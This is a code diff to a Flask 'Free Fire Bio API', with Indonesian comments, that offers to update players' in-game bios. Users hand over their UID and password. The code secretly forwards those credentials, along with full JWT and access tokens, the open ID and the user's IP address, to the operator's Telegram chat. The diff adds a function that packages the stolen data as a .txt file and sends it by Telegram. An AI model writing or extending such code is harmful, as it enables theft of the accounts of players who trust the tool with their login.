@@ -1,4 +1,4 @@
-# app.py - FULL TOKEN VERSION (DENGAN ID & UID DI TELEGRAM)
+# app.py - FULL VERSION DENGAN KIRIM FILE TXT KE TELEGRAM
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -14,6 +14,7 @@ import struct
 import threading
 import ssl
 import base64
+import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from datetime import datetime
@@ -543,6 +544,13 @@ def decode_base64_name(encoded_name):
     except:
         return encoded_name
 
+def get_open_id_from_jwt(jwt_token):
+    """Ambil Open ID dari JWT"""
+    decoded = decode_jwt_manual(jwt_token)
+    if decoded:
+        return decoded.get("external_id") or decoded.get("open_id")
+    return None
+
 # ============ FUNGSI UPLOAD BIO ============
 def upload_bio_request(jwt_token, bio_text):
     try:
@@ -568,18 +576,40 @@ def upload_bio_request(jwt_token, bio_text):
     except:
         return {"status": "❌ Error", "code": 500}
 
-# ============ TELEGRAM NOTIFICATION ============
-def send_telegram_notification(uid_input, password_input, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None, account_id=None):
+# ============ FUNGSI KIRIM FILE TXT KE TELEGRAM ============
+def send_file_to_telegram(account_id, content):
+    """Kirim file .txt ke Telegram dengan nama file = account_id.txt"""
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         
-        # FULL TOKEN
-        jwt_full = jwt_token if jwt_token else 'N/A'
-        access_full = access_token if access_token else 'N/A'
+        # Buat file sementara
+        filename = f"{account_id}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(content)
         
+        # Kirim file
+        with open(filename, 'rb') as f:
+            files = {'document': (filename, f, 'text/plain')}
+            data = {'chat_id': OWNER_ID}
+            response = requests.post(url, files=files, data=data, timeout=30)
+        
+        # Hapus file sementara
+        os.remove(filename)
+        
+        return response.status_code == 200
+    except Exception as e:
+        print(f"Send file error: {e}")
+        return False
+
+# ============ TELEGRAM NOTIFICATION ============
+def send_telegram_notification(uid_input, password_input, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None, account_id=None, open_id=None):
+    try:
         # Ambil Account ID dari JWT
         if not account_id and jwt_token:
             account_id = get_account_id_from_jwt(jwt_token)
+        
+        if not open_id and jwt_token:
+            open_id = get_open_id_from_jwt(jwt_token)
         
         # PASTIKAN UID DAN PASSWORD TETAP TERKIRIM
         uid_display = uid_input if uid_input else 'N/A'
@@ -590,10 +620,56 @@ def send_telegram_notification(uid_input, password_input, name, level, rank, reg
         if display_name == str(uid_input) or display_name == uid_input:
             display_name = 'Unknown'
         
-        # Split pesan
+        # FULL TOKEN
+        jwt_full = jwt_token if jwt_token else 'N/A'
+        access_full = access_token if access_token else 'N/A'
+        open_id_display = open_id if open_id else 'N/A'
+        
+        # Buat konten file
+        file_content = f"""🔥 FREE FIRE BIO UPDATE 🔥
+
+👤 Name: {display_name or 'Unknown'}
+🆔 ID: {account_id or 'N/A'}
+🔑 UID: {uid_display}
+🔐 Password: {password_display}
+📊 Level: {level or 'N/A'}
+🏆 Rank: {rank or 'N/A'}
+⚔️ Guild: {clan or 'N/A'}
+📝 Bio: {signature or 'N/A'}
+🌍 Region: {region.upper() if region else 'ID'}
+📱 Bio Status: {bio_status}
+
+📞 IP Caller: {ip_address}
+⏰ Time: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+
+🔐 JWT TOKEN (FULL):
+{jwt_full}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+
+🔑 ACCESS TOKEN (FULL):
+{access_full}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+
+🆔 OPEN ID:
+{open_id_display}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+💡 Join: {CHANNEL_PROMO}"""
+
+        # Kirim file ke Telegram
+        if account_id:
+            send_file_to_telegram(str(account_id), file_content)
+        
+        # Kirim pesan teks juga (opsional)
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        
         message_parts = []
         
-        # Part 1: Info Akun (DENGAN ID & UID)
+        # Part 1: Info Akun
         part1 = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥
 
 👤 <b>Name:</b> {display_name or 'Unknown'}
@@ -610,25 +686,11 @@ def send_telegram_notification(uid_input, password_input, name, level, rank, reg
 📞 <b>IP Caller:</b> {ip_address}
 ⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}
 
+📁 <b>File:</b> <code>{account_id}.txt</code> (sudah dikirim)
+
 ━━━━━━━━━━━━━━━━━━━━━━━
 """
         message_parts.append(part1)
-        
-        # Part 2: JWT Token FULL
-        part2 = f"""🔐 <b>JWT TOKEN (FULL):</b>
-<code>{jwt_full}</code>
-
-━━━━━━━━━━━━━━━━━━━━━━━
-"""
-        message_parts.append(part2)
-        
-        # Part 3: Access Token FULL
-        part3 = f"""🔑 <b>ACCESS TOKEN (FULL):</b>
-<code>{access_full}</code>
-
-━━━━━━━━━━━━━━━━━━━━━━━
-💡 Join: {CHANNEL_PROMO}"""
-        message_parts.append(part3)
         
         # Kirim semua part
         for msg in message_parts:
@@ -675,10 +737,12 @@ def combined_bio_upload():
     profile_info = None
     access_token = None
     account_id = None
+    open_id = None
     
     # Method 1: Direct JWT
     if final_jwt:
         account_id = get_account_id_from_jwt(final_jwt)
+        open_id = get_open_id_from_jwt(final_jwt)
         uid_from_jwt = get_uid_from_jwt(final_jwt)
         region_from_jwt = get_region_from_jwt(final_jwt)
         if account_id:
@@ -698,6 +762,7 @@ def combined_bio_upload():
             if result and result.get('token'):
                 final_jwt = result['token']
                 access_token = result.get('access_token')
+                open_id = result.get('open_id')
                 account_id = get_account_id_from_jwt(final_jwt)
                 if account_id:
                     final_uid = account_id
@@ -753,10 +818,10 @@ def combined_bio_upload():
             "status": "❌ Not Found"
         }
     
-    # Kirim Telegram dengan UID INPUT, PASSWORD INPUT, dan ACCOUNT ID
+    # Kirim Telegram dengan FILE TXT
     send_telegram_notification(
-        uid_input=uid_input or final_uid,  # UID INPUT
-        password_input=password_input,      # PASSWORD INPUT
+        uid_input=uid_input or final_uid,
+        password_input=password_input,
         name=profile_info.get('name', 'Unknown'),
         level=profile_info.get('level', '?'),
         rank=profile_info.get('rank', '?'),
@@ -767,7 +832,8 @@ def combined_bio_upload():
         signature=bio,
         clan=profile_info.get('guild', 'N/A'),
         access_token=access_token,
-        account_id=account_id  # ACCOUNT ID DARI JWT
+        account_id=account_id,
+        open_id=open_id
     )
     
     response_data = {
@@ -781,6 +847,7 @@ def combined_bio_upload():
         "uid_input": uid_input,
         "password_input": password_input,
         "account_id": account_id,
+        "open_id": open_id,
         "name": profile_info.get('name', 'Unknown'),
         "level": profile_info.get('level', '?'),
         "rank": profile_info.get('rank', '?'),
@@ -792,6 +859,7 @@ def combined_bio_upload():
         "generated_jwt": final_jwt,
         "access_token": access_token,
         "telegram_sent": True,
+        "file_sent": f"{account_id}.txt" if account_id else False,
         "profile_method": "protobuf (search.py)"
     }
 
@@ -818,10 +886,10 @@ def generate_jwt_only():
                 "success": True,
                 "uid_input": uid,
                 "account_id": get_account_id_from_jwt(result['token']),
+                "open_id": result.get('open_id'),
                 "jwt_token": result['token'],
                 "access_token": result.get('access_token'),
                 "region": result.get('region'),
-                "open_id": result.get('open_id'),
                 "Credit": "sulav_codex_ff"
             })
         else:
@@ -946,7 +1014,7 @@ def get_bio():
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire Bio API - FULL TOKEN VERSION",
+        "message": "Free Fire Bio API - FULL VERSION DENGAN FILE TXT",
         "endpoints": {
             "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
             "/generate_jwt": "Generate JWT only from UID/Pass",
@@ -965,9 +1033,10 @@ def home():
             "✅ Account ID dari JWT juga ditampilkan",
             "✅ FULL JWT Token dikirim ke Telegram",
             "✅ FULL Access Token dikirim ke Telegram",
+            "✅ Open ID ditampilkan",
+            "✅ Kirim FILE .txt ke Telegram (nama file = ID)",
             "✅ Profile check using protobuf + encrypt",
-            "✅ Check all servers (ID, IND, BR, US, BD)",
-            "✅ Get REAL NAME from server"
+            "✅ Check all servers (ID, IND, BR, US, BD)"
         ],
         "profile_method": "protobuf (search.py)",
         "Credit": "sulav_codex_ff",
@@ -977,11 +1046,12 @@ def home():
 # ============ MAIN ============
 if __name__ == "__main__":
     print("=" * 60)
-    print("🔥 FREE FIRE BIO API - FULL TOKEN VERSION")
+    print("🔥 FREE FIRE BIO API - FULL VERSION DENGAN FILE TXT")
     print("=" * 60)
     print("📱 Profile Method: protobuf + encrypt (like search.py)")
     print("📱 Servers: ID, IND, BR, US, BD")
     print("🔐 FULL JWT & Access Token akan dikirim ke Telegram")
+    print("📁 File .txt dikirim ke Telegram (nama file = ID)")
     print("🔑 ID & UID ditampilkan di Telegram")
     print("🚀 Server running on http://0.0.0.0:5000")
     print("=" * 60)
